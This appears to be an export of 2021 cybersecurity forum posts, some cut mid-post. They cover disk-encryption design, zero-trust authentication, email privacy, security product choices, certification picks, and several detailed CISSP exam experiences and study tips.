I find it increasingly frustrating to not be able to answer security related questions because I don't know what the state of the system was at a given time in the past and often even in the present, as the information is spread over various systems ranging from MDM to patch management as well as endpoint protection. The system could also be off radar because security tooling was not installed.

The credentials are not only stored in plain text, but also bring increased privileges. The manufacturer of the software says that this is how it is supposed to be.

I can't believe this. In my eyes, this not only violates information security principles, but is certainly illegal. I can imagine that it is a violation of the GDPR as well.

But how do larger organisations utilise PBD/NBDE? 

They can roll out NBDE to get some kind of transparent encryption where the end user does not have to interact with the encryption, since the machine boots up without the need to enter a password or put in a token/smart card. But against which threat does this defend? 

Full disk encryption is IMO mostly useful on mobile devices that can easily get lost or stolen or be tampered with in your hotel room while you are attending a conference dinner. So outside of your organisation's network NBDE doesn't make any sense except that you don't have to enter your password while in office and connected to the network with the tang server.

NBDE on machines that never leave the office building only makes sense to me as a tool to avoid annoying the users by not having them to enter a password. 

Servers/VMs can get FDE via LUKS and NBDE in a way such they also can reboot without any interaction. Which is nice, but the typical threat to servers isn't the adversary in the building who steals the drive from the 19"" rack. 

I have seen some slides from McCallum, where he suggest more sophisticated policy based models by combining multiple factors/techniques like tang/clevis and a yubikey token. But I haven't found examples of this in the wild yet. 

So what are usecases for larger organisations? How do they benefit from NBDE/PBD especially on end user machines like laptops?",2021-08-13

However, as I understand the design, it assumes that the key files are not compromised.  In Zero Trust design, we assume that all hosts are compromised, though.

So how do we reconcile those two ideas?  Should I be using something besides SSH keys or passwords?  Is there something about the keys that I'm missing?  Is the Zero Trust design relying on centralized authentication, such as AD, LDAP, or Kerberos to make authentication automatic?

1311,oyx34n,Cyber security and hacking experience,Hey y’all. Here’s a bit of info on me. I graduated a year ago with a degree in cybersecurity and currently working on an ITF + certificate. I am currently struggling to get a job related to my field as well as experience (literally all of the entry level jobs require 3 years of experience minimum). I was wondering how can I obtain experience in other ways besides getting a job in cyber security as well as hacking. I know bug bounties and hackthebox are the way to go but with that said what are other ways of obtaining experience so I can finally land a job? Thanks y’all for reading,2021-08-06

1316,oxoqy4,How vunerable to identity theft is personally identifying information sent over standard email in 2021?,"I'd value some netsec specialist views on the vulnerablity of standard email to identity theft in 2021.

Let our scenario be that an organisation, like a real estate agent or government organisation, reasonably requires personally identifying information (for example in the form of copies of a passport and birth certificate) but they solicit that information over standard email: sendocs@example.org. You send the passport and birth certificate as unencrypted email attachments.

What is the likelihood that identity thieves are able to intercept those documents? You might like to speak to factors in 2021 such as: the likelihood that email servers will have secure connections between them; the likelihood of email server hard drives being properly encrypted; or any other consideration you'd like to bring to bear.

I'm a hedge fund analyst looking at a pending cybersecurity IPO. $1.4 billion valuation

I'm skeptical for several reasons but lack the technical background. Company is very heavy on buzzwords (Quantum, SaaS/PaaS, cloud, blockchain, ""deep tech"").  

The company claims ""future-proofed"" software against quantum computing, calling themselves ""a leader in quantum encryption technology"".

From what I gather, their product is a symmetric encryption method. Specifically, they claim ""Although symmetric encryption keys are secure, to date there has been no secure way to create and distribute symmetric keys electronically. Arqit’s groundbreaking technology has solved these known issues.""  (Arqit's Prospectus, page 27).

One decision I am stuck on that I would really appreciate input and guidance on is whether to go with applocker/ Device Guard with Windows 10 Enterprise LTSC or to go with Threatlocker which does seem like a well thought out product that also includes elevation control and ringfencing along with application control. It would more than double the cost per endpoint when combined with SentinelOne though which makes me hesitant. We already need to purchase LTSC for our frontline worker stations so that is a significant yearly added expense.

I know that FortiAnalyzer is not really a proper SIEM tool, but it fits within our budget and seems like a pretty good product and is way more affordable than FortiSIEM.

1351,op3w4b,GPEN or GWAPT? (I don't have to pay for either),"Hi. I was hoping to hear the community's thoughts about these certs. I am really torn over what I should take.   


I am not working full time in the industry yet, but I have an opportunity to take one of these courses for free to put it simply to help me jumpstart things. Regardless of what I pick, I intend to pursue a SANs cert.   


I am familiar with the SANs meta (the index) and I am really looking more towards understanding the differences between the two certs and how it impacts job prospects moreso than how to pass them.   


One of my concerns is I heard GPEN is very Windows heavy; with that said, I also heard the GPEN covers things such as lateral movement and post exploitation, which are things I would like to explore more. To those who have taken the GPEN, was the material taught applicable to other configurations (non-windows systems) once you have knowledge of the other technologies and the GPEN-taught methodologies available ?   


In terms of career prospects, I would like to work in DFIR, especially in mobile forensics. I am aware SANS has forensics-specific courses, but it is not available to me in this circumstance I am in where I can get a SANS cert for free. The catalog available for me to choose from has the GPEN and GWAPT standing out the most to me.   


Considering most mobile devices are attacked via applications, which are constantly connected to clouds and remote servers, I thought web app pen testing might be a good fit. Is the GWAPT very narrow in that respect? is there anything with respect to pivoting or post exploitation covered in that class, or is it merely attacks against public facing systems (and what can be gained at that point in a network)?   


Correct me if I am wrong, but my understanding of the two certs are as follows:  


GPEN: Recon -> Scanning -> exploitation -> post-exploitation  
but all done on Windows Systems  


GWAPT: Recon-> Scanning->exploitation  
but extensively covers a variety of web technologies.   


Long-term, I'd like to take the OSCP one day (just to say I have it) so it is on my radar but not for right now. I am aware it is an entirely different beast from GPEN.   


Another thing I've considered is take the GPEN to go through the entire pentesting methodology, then take something in my financial means like a elearn security cert to fill in the gaps in my web app understanding ( hear those certs are more hands on too).   


I have some work prospects in DFIR at the moment, but if I don't end up in DFIR, I see myself going into red teaming anyway; I like it. Does it make sense to go through the  whole pentesting process with GPEN then learn about web app security later even though web app tech is ""hot"" right now? I am also considering the industry's movement to the cloud and the reliance of web technologies further to deliver organizational needs. It's great to get something like a SANs cert for free and I don't want to blow it on something that isn't on HR's Radar or is less reputable than the other.  


 Does the GWAPT lock me out of more pentesting jobs compared to the GPEN?",2021-07-22

I'm a cyber security major in uni here in Australia. Just got a pen testing job at a fairly large company as a grad role. They said they'd train me and stuff but if like to go in prepared. I'm pretty average with IT. I have been programming but haven't made or contributed to anything at all. I understand code though and know a few languages too. 

I've done a few CTFs on HTB as a part of a subject but that's about it.  Was doing TryHackMe and lost interest. What can I do to get me interested and have fun while learning it? Preferably pen testing related? I'd says my understanding is intermediate ish.

1355,ooqp8x,"What ""Early Warning"" tools, websites do you use to find the state of the internet?","Hello,

Got a question on the ongoing cyber ""competition"" that is wreaking the internet world these days. What tools do you use to find whether there is a good chance of maintenance downtime vs an actual fighting on the net. 

For example, looking at Thousand Eyes website, usually when a few major American and China servers are down, the next day or two would have some kind of news about attacks. Bleeping Computer are also relatively fast and detailed with their news. 

Any other suggestions please?

1369,oheats,"Confidentiality, Integrity, or Availability? Please help!","For my university course, there is a scenario-based question that  outlines the concept behind Gateway Authentication, and the wording of  it has me somewhat confused about whether this could be referring to  Confidentiality or Integrity.

The rationale in the scenario is:

*Gateway authentication ensures users and services are authenticated  by gateways to reduce the likelihood of unauthorised access and provide  an auditing capability to support the investigation of cybersecurity  incidents.*

The question it asks is, *if an organisation must meet a control  ""Users and services accessing networks through gateways are authenticated"" is this fundamentally addressing Confidentiality,  Integrity, or Availability?*

My confusion is that - could it not be Confidentiality because (in my  view) the whole reason behind authenticating a User or Service is to  prevent unauthorised parties/services from traversing through the  Gateway?

But then - could it not be Integrity since we are ""authenticating""  the users/services to validate that they are who/what they say they are,  and effectively confirming they are permitted to traverse through the gateway?",2021-07-10

1385,p1at9r,Passed CISSP exam first try with ~5 months of study,"Hey everybody,

So I've been holding off to make this post until I had received my [official pass results](https://imgur.com/bkZZkEx) and sent in my application for endorsement.  Since I sent off my application the other day, I figured it was time to share my story.  This is going to be a long one, so I'll break it up into sections so you can read what you want.

    My Exam Experience

I wanted to start with this section as I feel it's the most important.  I took my exam at a professional Pearson testing center, about 2 hours away from my home.  My exam was on a Thursday, so I took that week off of work and reviewed every day from the moment I got up to the moment I went to bed.  I would wake up, chug some coffee, get to work, and sip on GFUEL all day to keep focused.  The day of my exam, I slept in, went for a walk, went out to IHOP for breakfast, and then drove to the testing center where I was an hour early so I could find the room where the exam was and then review in my car for a bit.  Going into the exam, I did not feel prepared, or that I knew all the information needed... but I have a rule about sticking to my exam date otherwise I'll keep pushing it back.  I figured if nothing else, I was about to take a REALLY good (and expensive) practice exam.  I honestly could have probably used another month of study to feel more comfortable.

I read some study that people who take adaptive exams generally score higher if they take their time on their first 10 or so questions, so I did that.  My overall strategy was that I would plan for like 110 questions, and then probably fail.  But I wanted to take my time and thoroughly read each question.  I figured my chances of actually going up to 150 were slim.  After the first 20 or so questions, I felt like the exam was focusing on all those little protocols, frameworks, and acronyms that you generally see once in your studies and brush off as not important.  It really drilled down on topics I didn't spend a lot of time on.  I received multiple questions about SOC, and honestly I could not recall the differences at all.  Pretty sure it kept asking them because I kept getting it wrong (be sure that when it was all over, I went and studied SOC).  After about 60 questions, I felt exhausted.  I felt like most of stuff that I studied and focused on memorizing didn't show up at all.  I stressed over memorizing Common Criteria tiers just before going in... not a single question about it.  Memorized SDLC and RMF... nothing about those.  I don't want to go into further detail due to NDA, but yeah.  Overall, around question 80, I was actually getting kind of mad lol.  I felt like 80% of my questions were ""what should you do if this happens"" or ""where would you find this listed"" types of things.  Overall it seems to be less about knowledge you've studied, and more what is best for this certain situation.

I focused hard until I got up to question 100, and before I clicked the button to submit my answer, I prepared myself to have either terribly failed, or totally passed.  I didn't know which.  It seemed like either my overall train of thought was going to be correct, or it wasn't.  After question 100, I had about 40 minutes left.  I kept slogging through each additional question, expecting the exam to end.  I ended up going all the way to 150 questions and ended with just seconds to spare.  I really had to kick up my speed after the initial 100, and I did NOT expect to go to 150, and had planned my slow reading strategy based on that... oh well!  I was exhausted when the exam was over.  I took my folded printout, went to the bathroom, then got in the elevator down to the parking garage.  I opened the printout in the elevator, and saw ""Congratulations!"" on the first line.  I let out the biggest and loudest cheer in my life.  I then had to sit in my car for 20 minutes before driving home just to relax and recover from the exam.

I'd love to be able to tell you ""study this"" and ""don't study this"", but honestly from all my time on here and asking others who have taken the test, it's impossible to say what's important and what's not.  Things I was told were super important didn't show up at all, and things I was told not to focus on popped up several times.  For the first day after I passed my exam, I was actually a bit angry because I felt like I spent so many nights focusing on learning material that didn't show up at all on the exam... but I realized that they can only quiz you on so many topics with such few questions.  So I must have shown early on that I knew certain related things, and diving deeper would be pointless.

    My Previous Experience

I have my Bachelor of Science in Computer Information Technology, but I wouldn't say this was much help aside from test-taking experience/strategy.  I achieved my CCNA last year, which made Domain 4 a breeze.  I got my Security+ in January, which I think was a good stepping stone into CISSP as it covered a lot of initial topics... Basically everything you learn in Sec+ is utilized in CISSP, so I don't see a downside to taking it first.  In February and March I took the AZ-900 and AI-900 exams since I got free vouchers from Microsoft's cloud skills challenges, so that helped me introduction to cloud topics (which is about as deep as CISSP goes).

I've also been working as a ""Server & Network Administrator"", leading the Network & Security team and Helpdesk team.  I've been working here for a little over 5 years, since I was hired on to an empty team right out of college, and learned everything on my own as I went.  It's been a long journey of having to just ""figure it out"" since I didn't have a mentor or someone who could teach me.  Just lots of google, troubleshooting techniques, trial & error, and tackling problems as they came along.  My job responsibilities include creating and managing Windows servers, SAN devices, a lot of old undocumented proprietary software, automation through powershell & command prompt scripting, data backups, SQL database management, IIS, active directory, DHCP, DNS, and network device (routers, switches, etc), PCI DSS audits, etc.  Basically a jack of all trades, master of none.

Originally I was going to go down the Networking route, but for these past couple years, I've been on a daily call with our parent company's Security team, and one of them mentioned having previously worked in Networking, but moving to Security as the market was in higher demand and the pay scale was higher, which perked up my ears.  I mostly sit quietly on the call and wait for something about our office or users to be mentioned, but being able to listen to them talk smart guy stuff and go over the SIEM and other cool software has been a huge motivator.  Then they recommended I go for CISSP.

Luckily, my job responsibilities have included things such as PCI DSS and ISO audits, and generating policies and procedures (Domain 1), data encryption and access controls (Domain 2), vulnerability scanning, patching vulnerabilities, establishing virtual & physical servers, and public server cryptography (Domain 3), network device configuration and hardening as well as port security (Domain 4), active directory and user security rights management (Domain 5), and (*unfortunately*) incident response and log management (Domain 7).  Thus, while I haven't worked specifically in security, I have had a little bit of experience across a lot of things... which I thought kind of fits perfectly with the ""mile wide, inch deep"" mentality.  I wouldn't say my experience was very big, but it helped me relate certain topics to work.

    My Resources

So... I kind of get nervous when it comes to studying and try to [get every resource](https://imgur.com/utz3mdE) I can find.  Which is a bit overkill, but at least I can see what sticks with me.  Admittedly, I'm more of a visual learning than a textbook reader.

**Thor Teaches on Udemy**    
This was my main resource, and where I gained the most knowledge.  I would load up these videos whenever I could focus and stare at the screen.  I even picked up a Microsoft Wireless Display Adapter so I could cast my browser on my Surface to my TV and sit on my couch and listen.  Great content, and his notes were fantastic.  I ended up printing out all his PDF notes and putting them in sheet protectors in a binder.  The only thing that sucked is that by grouping the lessons into two-domain courses, some courses (like the one that includes D3 & D4) end up being much higher value than the ones that focus on smaller domains.  Still, I'd highly recommend the series.  9/10

**Certification Station on Discord**    
This server on Discord was fantastic.  It really kept me motivated, and helped me work through the thought process on various questions.  If you stay active in the channel, you'll end up doing hundreds of practice questions without even thinking about it.  11/10

**MindMap videos by Rob Witcher on YouTube**    
I'm pretty sure I'm responsible for hundreds of plays on these videos.  These videos became my main audio source while walking or driving to work, and I'd even listen to them as I went to sleep.  It's a great way to refresh important topics as well as quickly go over a chapter before diving into it with a main resource.  And they're free.  Not enough deep info to learn everything, but just about the perfect  review resource.  You're crazy if you don't utilize these.  10/10

**CISSP Cert Prep (2021) by Mike Chapple on LinkedIn Learning**    
Some people like Mike Chapple's teaching method, and some don't.  But his updated LinkedIn Learning videos are very well produced, and include chapter quizzes to make sure you're taking in information rather than just zoning out.  It was another source I used primarily for audio, or for getting another perspective on a confusing topic from Thor's videos.  I do think it sometimes focused on less important things and glanced over big topics, but that may be because the course is designed to go along with the Official Study Guide textbook.  7/10

**Kelly Handerhan's CISSP course on Cybrary**    
Kelly is very passionate about what she teaches, which helps keep you motivated, but this video series really lightly glosses over the information.  It can serve as a good review or refresher, but shouldn't be your main video source.  However, it's free, so still nice.  5/10

**Adam Gordon's notes**    
So everyone on Certification Station knows of Adam's notes, which are freely available on the Discord server.  They've been formatted into a nice format by some users in the server that have made reading a lot easier.  I'm not sure if his ITPro.TV course offers something nicer, but I'd say the only thing these notes lack is looking nice and organized.  Otherwise, they are FULL of information and tricks to help remember certain things.  I'd highly recommend reading through these at least once.  8/10

**ISC2 CISSP Official Study Guide (2018)**    
Honestly, I didn't use this much.  I tried to read through it, but I felt it really dragged on through certain topics.  There's no reason Domain 2 should get as many pages as it does.  After reading through a few chapters, this became more of a reference book.  I'm sure it would be great for those that can read through it in full, but I couldn't do it.  6?/10

**CISSP Study Guide (3rd Edition) by Eric Conrad**    
I picked this book up because it was shorter than the OSG.  Where the OSG wanted 140 pages for something, this book covered it in 60.  Most of the reading I did came out of this book.  I highly preferred the condensed design, but the book was certainly showing its age.  This ""latest"" edition is from 2016, and could do with some updates.  6/10

**CISSP For Dummies (6th Edition)**    
I felt this book was great!  I don't see it recommended here enough.  It's from 2018, so reasonably updated.  I didn't read it through fully, but I could see it being a very competent primary reading source.  I used it mostly for reference to double-check things that didn't make sense in my video studies, or practice questions that confused me.  The only thing really lacking in this book is that the site for redeeming the online practice exams is defunct, so you have to call their support line to get an activation code on their new site.  Not a huge issue as I didn't really use their practice questions, but a noticeable issue.  It's also still smaller than the OSG.  7/10

**11th Hour CISSP by Eric Conrad**    
This book was just ok.  I bought both the physical and Audible versions.  Some people said they used it as a review after going over everything, but I think it's too light for that.  I think it would do well as an introduction book when you're first starting your studies and want to dip your toes into each domain first over the course of 200 pages.  Nothing to really learn much info from, but a good way to understand the general topics you'll be diving into.  5/10

**The Effective CISSP by Wentz Wu**    
This book is designed to be a focus on Domain 1 and 2, with a touch of 3.  For the most part, it does that.  I was expecting it to go into further detail than what I had already learned, but that wasn't really the case.  If you've paid attention in your primary study source, this will mostly just repeat what you've already learned, but that can be nice if it's been a while since you went over these topics.  It does give a good description between various steps and such.  Is the book necessary?  Not really... but if you want to hammer in these particular domains, it's a nice addition if you have time.  7/10

**How To Think Like a Manager by Luke Ahmed**    
I'd definitely recommend this book.  It's cheap, and goes over 25 questions and the thought process you should go through.  Best of all, it goes through a VARIETY of questions you would go through, such as ""pick the best out of a list of potentially correct answers"", ""you can easily eliminate two of these"", ""the actual question is asking you for something that can specifically be answered by only one of these"", etc.  The only issue I had with the book was one question (Q14) that focused on firewall architecture ""tiers"", which is not listed in any textbook, and the only video source I could find was one by Luke, and I still couldn't determine what a ""three-tier 2"" architecture and such were.  I spent a couple hours trying to figure this out, but then all of Certification Station agreed it didn't make any sense, and wouldn't show up in the exam, which it didn't.  8/10

**CISSP Exam Guide Ultimate Edition 2021 by Walter Roberts**    
Look... Stay away from this.  It's useless.  The layout is terrible, it looks like it was typed up in Microsoft Word and printed, it skips over important information, and focuses way too heavily on stupid stuff (we don't need two pages on what Malware is).  When I was going through my CCNA studies, I found a cheap book on Amazon called ""CCNA 200-301 Quick Reference Guide"" that was like $12, and 112 pages.  It included all of the exam objectives with a brief description and notes about each objective, allowing the reader to quickly reference each objective and see if they knew the topic or needed to read more.  I was looking for a cheap book that did something similar... just a quick reference of each topic so I could determine if I've missed something.  This book was not that.  At all.  The only reason it gets any points is because it was cheap.  2/10

    Practice Exams  & Quizzes

I used a ton of practice exams and quiz sources... I used the official ISC2 practice exam book, I used CCCure, I used practice questions from all the textbooks above, I used the new Pocket Prep app (whatever it's called now), Wentz and Adam's Q of the Day, etc.  Certification Station itself is a huge conglomerate of practice questions from various sources, so its hard to tell which one was which.  I wouldn't say I went through thousands of questions like many people here... probably a total of like 500-600.  Like many people here say, the practice exams are not like the real thing.  There may be a question or two that pop in and seem similar, but generally those questions are freebie questions anyways (straight to the point definition-like questions).  What I really aimed to do was identify my weak spots and then study those sections.  For me, the new Pocket Prep app was really useful for this because it gives a readout of your proficiency in each domain so I could see which ones I was lacking, and then go back and review those.

But honestly?  Whatever you're using is probably fine.  Don't be like me and waste a huge amount of time and money trying to find the ""best"" practice exams.  There aren't any, and ISC2 send C&D's to people who create questions too similar to the real thing (like with Wentz).  So you're not going to find perfect practice questions.  Just find something that helps you pinpoint your weak spots, and then review those sections.  The best thing you can do is practice and test your knowledge, so just find something and study.  Try to use a couple resources if you can so you can get a variety.

    In Closing...

The exam was tough.  I'm still surprised I passed, but it's encouraged me to continue my studies.  I wouldn't say I'm wayyy more knowledgeable than I was before I started studying... but that may be because I had a good basepoint.  I certainly learned a few interesting and useful things, and hammered down some stuff that I lightly touched on in other certs.

I plan on taking CISM next since the material is similar.  A lot of people just said to go take a few practice exams and then take the real thing, but I want to read through a bit before taking it, as I still feel like there are some CISSP topics I'm not too familiar with.  After that, I'm hoping to either jump into CySA+ or eJPT... I just feel like I've taken a lot of certifications involving knowledge and procedures, but I still have a huge feeling of Impostor Syndrome, and I don't feel like I have as many practical skills as I'd like.  I was offered a few ""Senior Security Analyst"" positions just minutes after posting that I passed the exam, but I still feel too inexperienced.  So overall I'm trying to find something that can prepare me for a more security-centric job.

Sorry for the novel here... just trying to be thorough.",2021-08-09

Initially I started marking on book but soon I realized, it was going into my volatile memory. I needed it in my secondary memory so I started writing notes for each domain and they helped me a lot. This was the best decision of mine.

Group study on google meet for 2 weeks with 2 other aspirants. We studied for almost 3 hours daily and 8 hours on weekend just 3 weeks before the exam. Best part is, all 3 of us PASSED. I am sure they are reading my post right now ;)

My discord group is still active where many people are preparing to appear for the exam.

**About the exam:** It’s true that the real questions are different than the practice ones however; if your concept is clear then you would be able to rule out at least 2 options most of the time. Read questions carefully. Keep maximum 1 minute for each question and if you take more than that then cover that gap with the straight forward questions. Watch these 3 videos for the right mindset before you go for the exam–

1388,orz3bf,5 Tips For Passing The CISSP Exam,"Thought I’d share some of my top tips for passing the CISSP exam.

**#5 Read and Relate**

“I don’t understand, I read the Shon Harris book 3 times! How did I fail the exam?”

You read The Odyssey.

You read The Old Man and The Sea.

You read To Kill A Mockingbird.

You don’t read a CISSP study guide.  You must relate and understand a CISSP study guide.

Software Development Security was my weakest domain.  I’d turn my computer speakers up, and listen to a 2-hour video about Software Development Security on YouTube or CBT Nuggets.  Then, I’d proceed to forget everything in three days.  I don’t create software for a living, which is why I had a tough time relating the Software Development Life Cycle (SDLC) to the real world.

But I did work in network security for a living.  A job in which I applied cryptography concepts into action through the use of VPNs and SSH every single day.  This is why cryptography became my strongest domain, I had the ability to relate what I read in CISSP study guides.  I’d read about symmetric and asymmetric encryption, and then apply it for customer devices and environments.  It was awesome.

In an effort to increase my knowledge about the SDLC though, I Googled and YouTubed all I could.  I’d Google things like “iphone software development process”, or “SDLC process used by Facebook”.  I’d read about these real world examples to better relate it to the CISSP books.

I found out too late that the CISSP is actually not a memorization test, it’s a test of concepts.  Keep that in mind as you study!

**#4 Obsess**

“I tried to make the game perfection” – Michael Jordan

How do you get good at something? You have to keep doing it over and over again.  If you want to be a good basketball player, you gotta put in hours shooting in the gym, learning how to dribble tighter, run faster, and shoot more accurately.  Michael Jordan obsessed over the game, and went on to become a basketball legend, and accumulate an estimated net worth of $1 BILLION!

Michael Jordan was the totality of all his training.

I remember obsessing so much over the CISSP that sometimes I neglected my friends, family, and general hygiene.  When obsessing, it’s hard to let go.   While driving, going to sleep, or eating, my obsessive subconscious would still think of a problem, and continue to work on it.

Obsession can be dangerous mentally, but with proper control, it can be an effective productivity tool.

Luckily, you can start the obsession phase 2 months before you take the actual exam.  This is the time to sleep, breathe, and eat CISSP.  Just study it everyday right up until the exam so everything stays fresh in your brain.

**#3 Write**

Not type. Not email.  Not text.

Write.

Pencil and paper.

Read about vulnerability testing, and then draw out a network topology map and place the firewalls, IPS, IDS, and servers where they should belong.

Read about system ring architecture, and actually sketch the proper and secure path for a system process.

Read about the OSI Model and actually draw out how a packet starts at the application layer on Host A, and travels up the layer to Host B.

Let the information you read, flow from your brain, through your arms, and to the tip of your pencil.  When you get a question about a packet having issues at the network layer on the exam, your brain will recall back to your hand motion of writing about it on a piece of paper.

**#2 Trust Yourself**

Before actually taking the exam, all I heard was that the CISSP was an incredibly tough exam.  This was in the days of the 250 questions and 6 hours of total mess-with-your-mind torture exam.

This is true.  But I’m here to tell you that it is a completely passable exam! It’s not that difficult.  The only way to do it is to follow the same formula as everyone else who has passed.  Get some real life security experience, study the Shon Harris books, take an ungodly amount of practice exam questions, and mentally prepare yourself to sit in an exam room for a prolonged period of time while being mentally tested.

After completing about 180 questions during the exam, I actually started to feel fairly confident that I will pass.  Before taking the exam, I felt 60% confident that I’d pass, even though I studied for 10 months.  It is only after passing, that I realized I should’ve trusted myself 100%.

I’m trying to boost your confidence now, and not after the exam.  If you study well, you will be a CISSP.  It is not that difficult.

If you understand the concepts, and can truly see the big picture as it relates to information security, and have done your best to study for the exam, then trust yourself.  You will pass.

**#1 Don’t Give Up**

The alarm rings at 8:00 a.m., but it’s your day off.

You came home from a tough week of work, spent time with your family trying to hide your exhaustion, then finally collapsing into bed.

You deserve some rest.

Then your brains reminds you about that alarm you set early in the morning.  You still have an exam to take in 5 weeks.  You may have failed it the first time, but you’re definitely not going to fail it the second time.  You still have to read more about Common Criteria and Spanning Tree Protocol.  You still need to nail down all the steps in a forensic investigation process.

I can tell you not to give up a million times.  I can tell you that dedicating yourself to study for the CISSP is the only way to pass the first time, but it’s ultimately your decision.

Don’t give up.",2021-07-26
1389,ouqq33,I PASSED AGAIN!,"I passed the second time. So long story short, I am part of those who participated in the Online Proctored Exams and got our results canceled in Febraury.

Intially, I was very furious for the actions ISC2 took against us. 

I did nothing special to prepare again. I just went through the notes I had prepared and I passed today.

1390,p3jdsz,"Obligatory ""passed at 103"" and some tips I haven't seen elsewhere","Passed today at 103!  Didn't have a lot of prior CISSP relevant experience (I have the required job experience, but most of my jobs barely touched on security topics).  The Security+ has about 50% overlap with the CISSP, and I highly recommend taking it first.  Consistently averaged 70-75% on all CISSP practice question banks across multiple platforms.  


Tips I haven't seen elsewhere:   
\-The test requires a good bit of reasoning / IQ test style stuff, and English comprehension.  A dozen questions had long paragraphs of information with one or two key words that totally changed the ""correct"" answer, so be sure you pay attention to *every single word* in the long format questions.

\-Skim the question, read the answers, then read the question carefully again.  The answers frequently tell you what part(s) of the long paragraph are the most important.

\-Brain dumping in the exam room: memorizing key acronyms/mnemonics, security models, OSI model, basic ports, encryption and hashing algos, other models, formulas, etc is a good idea.  When necessary, come up with your own ways to remember them rather than relying on frequently terrible mnemonics in books.  Once you're in the exam room, guess what!  You're allowed to brain dump everything you memorized on to paper!  This helped me save a lot of brain clock cycles, as I didn't have to run through everything I'd memorized mentally, and could glance at the paper for the relevant information. 

\-As Handerhan mentions, when ethical questions are at stake, lean towards the most ethical.  I don't want to elaborate further, but one question I got was really tailored to make me choose the ""unethical"" route, and IRL I likely would have - because I personally IRL knew the ""correct"" answer, and the ""unethical"" answer really wasn't unethical IRL -- but in the exam, you frequently have to work with the information presented in the question.  

\-About 3 of the questions were totally baffling.  I'd never read or heard about any of the concepts in the question or answers, and the question itself wasn't entirely clear.  Try to suss out what they're getting at, eliminate incorrect or non-real answers, and roll the dice.

\-Read the question and answers multiple times.  Every word.  Don't reflexively give the seemingly correct technical answer when an obfuscated better answer may exist.  

\-Seriously, a lot of it is reasoning.  Figure out the key points of the question, eliminate wrong answers, then make a detailed mental analysis of the remaining answers.

\-You will encounter questions you've no idea what the answer is.  Think on it for a few minutes (you have time), eliminate wrong answers, guess, and move on.  This isn't a test you must get a 90% on to pass.  Many options are debatable.  

\-When complex topographies are described, try to imagine it in your mind, with the flow of traffic.  But I'm a visual thinker, YMMV.

\-Day of the exam: schedule the exam for a time of day that you're usually mentally sharp, sleep well, eat light meals, take your usual amount of caffeine (I like L-theanine, a natural supplement extracted from green tea that calms caffeine and brain jitters - not woo woo, it is proven.)  Watch Greenblatt's 2018 and 2020 Exam Tips on YT, and Handerhan's ""why you will pass the CISSP.""  Get out of the IT grunt mindset and in to the master mindset.  Greenblatt's ""think like Kirk and Spock"" metaphor actually helped me on a couple questions.  I'd catch myself being too Spock-analytical, switch to Kirk mode, and the answer would pop out.  Wear comfortable yet professional clothes to the exam (a nice outfit can psychologically make you feel important and get in the mindset, IMO), wear a short sleeved shirt in case it's warm, and bring a light jacket in case it's cold.  

\-My personal pre-public speaking/important moment ritual: Take a minute or two to collect your thoughts and calm your mind.  Imagine yourself striding out successful.  Find a wall and stand against it and fix your posture.  Smile.  Feel the badassery flow through you.  YOU have come far enough and learned enough to sit for this $750 exam.  You can do it.  If you fail, there's always 30 days from now.  Breathe, stretch, fix your posture again, smile, and get to work!      


\-Read CISSP Sybex 8th edition once  
\-Listened to Inside Cloud and Security free youtube videos while in the car - they have great free pdfs of the slides for study - Mind Map videos are more entertaining to watch, but the shorter video format isn't conducive to car rides.  
\-Paid $20 for Pocket Prep for a month - it was useful to get info on what domains to focus on and to have a portable practice option.  Questions seemed very similar to the Sybex free questions.  A day before the exam, I went through and cleared out all the missed questions by getting them correct.  
\-Did a few hundred Sybex practice exam questions - would tab out and google stuff as needed to reinforce.  
\-These ""cheat sheets"" are also awesome: [https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf](https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf) (change the last number of the URL to 1 through 8 and download each)",2021-08-13
1391,p0gh9k,"Passed, 100q","Been seeing a lot of ""Passed!"" posts so thought I'd throw in my experience.

Just took the exam last night and passed at 100 questions at a little over an hour.

The key takeaway I want to pass on to you if you're studying: ***you can do it!***

Personal history: I'm old enough to have 2 kids in college, been doing IT and security since my career started in 1994, and I was a computer science major.  I've been involved in SOC audits, written security policies, and consulted with lots of companies regarding how to secure IT assets properly, including extensive HIPAA consulting.  Branched out and got EnCE forensic certification in 2014 and have been doing forensics and testimony in civil cases since then in addition to the other consulting.  Lots of other certs as well, including the suite of CompTIA and Microsoft. In a word, I have experience, and I know how to take tests.

I'd thought about getting CISSP starting in about 2010 but had put it out of my mind after seeing the commitment it takes to get it, and the Shon Harris book just sat on my shelf for 10 years afterwards.  Plus, I couldn't justify the cert as bringing anything to my resume that I didn't already have.  A colleague of mine wanted CISSP really bad though, so as a challenge I told him I'd go for it too.  We could study together and push each other along.  

2021 was our year, even with the exam being updated.  He is scheduled to take his in October and I've been encouraging him to study more, but life has a way of telling you that your focus needs to be on other things like family and work.  Same applied to me, but I started just giving myself little 10 or 20 question quizzes in between other obligations, or slipping in a Youtube video or a quick read of a few pages.  Eventually the quizzes worked up into 50 questions, and then I took full on 150 question exams.

Resources that are invaluable:

* RELEVANT EXPERIENCE.  This is passable without experience, but if you have worked even tangentially to security, lean on it.
* TEST TAKING. Practice tests count for a TON and gets you in the mindset.  Don't cheat on them.  If you're struggling, make them smaller, even if it's just 1-5 questions.  Get to where you are comfortable and then work your way up.  Whether you miss a question OR EVEN IF YOU GET IT RIGHT, read the explanation and refer back to the books.  Retake missed questions.
* REDDIT. Read your colleagues' experiences, but also be aware that there are some amazing resources here, including the actual authors of study guides and books, and professional trainers.  They don't hide, and don't be afraid to reach out.
* YOUTUBE.  There's so many free videos out there, and many are wonderful at getting the fundamentals ingrained in your mind.

Things I didn't do:

* Read any book cover-to-cover.  I didn't have time or inclination.
* Keep testing myself on subjects I was already familiar with.  For example, I knew I was strong in forensics, but weak in encryption.  So I focused more on encryption until I got comfortable with it.

Specific tools I used to study:

* BOSON.  I will swear up and down that Boson is what got me through this.  They've updated to the 2021 material.  The explanations for answers are top-notch.  By test day I was scoring 95%-100% on full exams.  The only (\*tiny\*) complaint I have about it is that the online version of the test doesn't let you create a custom exam to skip questions you've already answered X number of times, which the local installation does.
* CISSPREP. I hated this test bank with a passion, because it was so hard.  I never broke about 65% on it.  However, its questions really made me think, and were not just rote memorization answers.  I can definitely see the value in the questions it asks, but that doesn't mean I enjoyed taking them.
